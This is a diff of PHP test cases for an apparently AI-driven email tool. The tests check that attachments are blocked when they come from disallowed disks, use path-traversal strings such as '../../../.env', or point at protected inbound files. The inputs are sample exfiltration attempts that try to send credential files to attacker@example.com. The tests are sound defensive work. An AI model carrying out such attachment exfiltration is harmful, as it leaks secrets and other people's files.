@@ -145,6 +145,181 @@ it('attaches files passed explicitly via the attachments parameter', function ()
     expect($parts[0]->getBody())->toBe('logo-data');
 });
 
+// ── attachment authorization ────────────────────────────────────────────────
+
+it('refuses to attach a file from a disk that is not on the allowlist', function () {
+    Storage::fake('local');
+    Storage::fake('secrets');
+    Storage::disk('secrets')->put('credentials.env', 'APP_KEY=super-secret');
+
+    config(['laraclaw.filesystem.allowed_disks' => ['local']]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['attacker@example.com'],
+        'subject' => 'Exfiltration',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'secrets', 'path' => 'credentials.env'],
+        ],
+    ]));
+
+    expect($result)->toContain("Disk 'secrets' is not allowed");
+});
+
+it('refuses to attach a file outside the disk root', function () {
+    Storage::fake('local');
+
+    config(['laraclaw.filesystem.allowed_disks' => ['local']]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['attacker@example.com'],
+        'subject' => 'Exfiltration',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => '../../../.env'],
+        ],
+    ]));
+
+    expect($result)->toContain('Path traversal is not allowed');
+});
+
+it('refuses to attach a file from a protected attachments directory', function () {
+    Storage::fake('local');
+    Storage::disk('local')->put('inbound/someone-elses-file.pdf', 'private-data');
+
+    config([
+        'laraclaw.filesystem.allowed_disks' => ['local'],
+        'laraclaw.filesystem.incoming_attachments_path' => 'inbound',
+        'laraclaw.filesystem.outgoing_attachments_path' => 'outbound',
+    ]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['attacker@example.com'],
+        'subject' => 'Exfiltration',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => 'inbound/someone-elses-file.pdf'],
+        ],
+    ]));
+
+    expect($result)->toContain('Cannot read system directory');
+});
+
+it('refuses to attach a protected file reached through a relative path', function () {
+    Storage::fake('local');
+    Storage::disk('local')->put('inbound/someone-elses-file.pdf', 'private-data');
+
+    config([
+        'laraclaw.filesystem.allowed_disks' => ['local'],
+        'laraclaw.filesystem.incoming_attachments_path' => 'inbound',
+        'laraclaw.filesystem.outgoing_attachments_path' => 'outbound',
+    ]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    // This one stays inside the disk root, so the traversal check is happy with it.
+    // Only collapsing the path first reveals that it lands in a protected directory.
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['attacker@example.com'],
+        'subject' => 'Exfiltration',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => 'reports/../inbound/someone-elses-file.pdf'],
+        ],
+    ]));
+
+    expect($result)->toContain('Cannot read system directory');
+});
+
+it('reports a missing attachment instead of throwing', function () {
+    Storage::fake('local');
+
+    config(['laraclaw.filesystem.allowed_disks' => ['local']]);
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['to@example.com'],
+        'subject' => 'Missing file',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => 'reports/nope.pdf'],
+        ],
+    ]));
+
+    expect($result)->toContain('file not found on disk');
+});
+
+it('still attaches a file that passes every filesystem check', function () {
+    Storage::fake('local');
+    Storage::disk('local')->put('reports/q3.pdf', 'report-data');
+
+    config(['laraclaw.filesystem.allowed_disks' => ['local']]);
+
+    $captured = null;
+    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
+        $captured = $e->message;
+    });
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['to@example.com'],
+        'subject' => 'Quarterly report',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => 'reports/q3.pdf', 'filename' => 'q3.pdf', 'mime_type' => 'application/pdf'],
+        ],
+    ]));
+
+    expect($result)->toContain('Email sent');
+    expect($captured)->toBeInstanceOf(Email::class);
+
+    $parts = $captured->getAttachments();
+    expect($parts)->toHaveCount(1);
+    expect($parts[0]->getFilename())->toBe('q3.pdf');
+    expect($parts[0]->getBody())->toBe('report-data');
+});
+
+it('refuses a disallowed attachment on reply as well as send', function () {
+    Storage::fake('local');
+    Storage::fake('secrets');
+    Storage::disk('secrets')->put('credentials.env', 'APP_KEY=super-secret');
+
+    config(['laraclaw.filesystem.allowed_disks' => ['local']]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'reply',
+        'uid' => 1,
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'secrets', 'path' => 'credentials.env'],
+        ],
+    ]));
+
+    expect($result)->toContain("Disk 'secrets' is not allowed");
+});
+
 it('sends without attachments when the message has none', function () {
     $captured = null;
     Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
